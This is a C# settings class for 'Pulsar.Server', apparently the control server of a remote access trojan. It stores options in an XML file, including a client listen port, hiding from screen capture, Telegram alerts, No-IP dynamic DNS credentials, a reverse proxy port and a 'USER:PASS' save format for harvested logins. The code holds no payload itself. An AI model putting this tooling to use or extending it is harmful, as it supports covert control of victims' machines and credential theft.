using System.IO;
using System.Windows.Forms;
using System.Xml;
using System.Xml.XPath;
using Microsoft.Win32;

namespace Pulsar.Server.Models
{
    public static class Settings
    {
        private static readonly string SettingsPath = Path.Combine(Application.StartupPath, "settings.xml");

        public static readonly string CertificatePath = Path.Combine(Application.StartupPath, "Pulsar.p12");

        private static readonly string isDarkMode = _isDarkMode().ToString();

        private static bool _isDarkMode()
        {
            int res = -1;
            try
            {
                res = (int)Microsoft.Win32.Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize", "AppsUseLightTheme", -1);
            }
            catch { }

            if (res == 0)
            {
                return true;
            }
            else if (res == 1)
            {
                return false;
            }
            else
            {
                return false;
            }
        }

        public static bool DarkMode
        {
            get
            {
                return bool.Parse(ReadValueSafe("DarkMode", isDarkMode));
            }
            set
            {
                WriteValue("DarkMode", value.ToString());
            }
        }

        public static bool HideFromScreenCapture
        {
            get
            {
                return bool.Parse(ReadValueSafe("HideFromScreenCapture", "False"));
            }
            set
            {
                WriteValue("HideFromScreenCapture", value.ToString());
            }
        }

        public static bool DiscordRPC
        {
            get { return bool.Parse(ReadValueSafe("DiscordRPC", "False")); } // Changed default from "True" to "False"
            set { WriteValue("DiscordRPC", value.ToString()); }
        }

        public static ushort ListenPort
        {
            get
            {
                return ushort.Parse(ReadValueSafe("ListenPort", "4782"));
            }
            set
            {
                WriteValue("ListenPort", value.ToString());
            }
        }

        public static bool IPv6Support
        {
            get
            {
                return bool.Parse(ReadValueSafe("IPv6Support", "False"));
            }
            set
            {
                WriteValue("IPv6Support", value.ToString());
            }
        }

        public static bool AutoListen
        {
            get
            {
                return bool.Parse(ReadValueSafe("AutoListen", "False"));
            }
            set
            {
                WriteValue("AutoListen", value.ToString());
            }
        }

        public static bool EventLog
        {
            get
            {
                return bool.Parse(ReadValueSafe("EventLog", "False"));
            }
            set
            {
                WriteValue("EventLog", value.ToString());
            }
        }

        public static bool TelegramNotifications
        {
            get
            {
                return bool.Parse(ReadValueSafe("TelegramNotifications", "False"));
            }
            set
            {
                WriteValue("TelegramNotifications", value.ToString());
            }
        }


        public static bool ShowPopup
        {
            get
            {
                return bool.Parse(ReadValueSafe("ShowPopup", "False"));
            }
            set
            {
                WriteValue("ShowPopup", value.ToString());
            }
        }

        public static bool UseUPnP
        {
            get
            {
                return bool.Parse(ReadValueSafe("UseUPnP", "False"));
            }
            set
            {
                WriteValue("UseUPnP", value.ToString());
            }
        }

        public static bool ShowToolTip
        {
            get
            {
                return bool.Parse(ReadValueSafe("ShowToolTip", "False"));
            }
            set
            {
                WriteValue("ShowToolTip", value.ToString());
            }
        }

        public static bool EnableNoIPUpdater
        {
            get
            {
                return bool.Parse(ReadValueSafe("EnableNoIPUpdater", "False"));
            }
            set
            {
                WriteValue("EnableNoIPUpdater", value.ToString());
            }
        }


        public static string TelegramChatID
        {
            get
            {
                return ReadValueSafe("TelegramChatID");
            }
            set
            {
                WriteValue("TelegramChatID", value);
            }
        }

        public static string TelegramBotToken
        {
            get
            {
                return ReadValueSafe("TelegramBotToken");
            }
            set
            {
                WriteValue("TelegramBotToken", value);
            }
        }




        public static string NoIPHost
        {
            get
            {
                return ReadValueSafe("NoIPHost");
            }
            set
            {
                WriteValue("NoIPHost", value);
            }
        }

        public static string NoIPUsername
        {
            get
            {
                return ReadValueSafe("NoIPUsername");
            }
            set
            {
                WriteValue("NoIPUsername", value);
            }
        }

        public static string NoIPPassword
        {
            get
            {
                return ReadValueSafe("NoIPPassword");
            }
            set
            {
                WriteValue("NoIPPassword", value);
            }
        }

        public static string SaveFormat
        {
            get
            {
                return ReadValueSafe("SaveFormat", "APP - URL - USER:PASS");
            }
            set
            {
                WriteValue("SaveFormat", value);
            }
        }

        public static ushort ReverseProxyPort
        {
            get
            {
                return ushort.Parse(ReadValueSafe("ReverseProxyPort", "3128"));
            }
            set
            {
                WriteValue("ReverseProxyPort", value.ToString());
            }
        }

        private static string ReadValue(string pstrValueToRead)
        {
            try
            {
                XPathDocument doc = new XPathDocument(SettingsPath);
                XPathNavigator nav = doc.CreateNavigator();
                XPathExpression expr = nav.Compile(@"/settings/" + pstrValueToRead);
                XPathNodeIterator iterator = nav.Select(expr);
                while (iterator.MoveNext())
                {
                    return iterator.Current.Value;
                }

                return string.Empty;
            }
            catch
            {
                return string.Empty;
            }
        }

        private static string ReadValueSafe(string pstrValueToRead, string defaultValue = "")
        {
            string value = ReadValue(pstrValueToRead);
            return (!string.IsNullOrEmpty(value)) ? value : defaultValue;
        }

        private static void WriteValue(string pstrValueToRead, string pstrValueToWrite)
        {
            try
            {
                XmlDocument doc = new XmlDocument();

                if (File.Exists(SettingsPath))
                {
                    using (var reader = new XmlTextReader(SettingsPath))
                    {
                        doc.Load(reader);
                    }
                }
                else
                {
                    var dir = Path.GetDirectoryName(SettingsPath);
                    if (!Directory.Exists(dir))
                    {
                        Directory.CreateDirectory(dir);
                    }
                    doc.AppendChild(doc.CreateElement("settings"));
                }

                XmlElement root = doc.DocumentElement;
                XmlNode oldNode = root.SelectSingleNode(@"/settings/" + pstrValueToRead);
                if (oldNode == null) // create if not exist
                {
                    oldNode = doc.SelectSingleNode("settings");
                    oldNode.AppendChild(doc.CreateElement(pstrValueToRead)).InnerText = pstrValueToWrite;
                    doc.Save(SettingsPath);
                    return;
                }
                oldNode.InnerText = pstrValueToWrite;
                doc.Save(SettingsPath);
            }
            catch
            {
            }
        }
    }
}
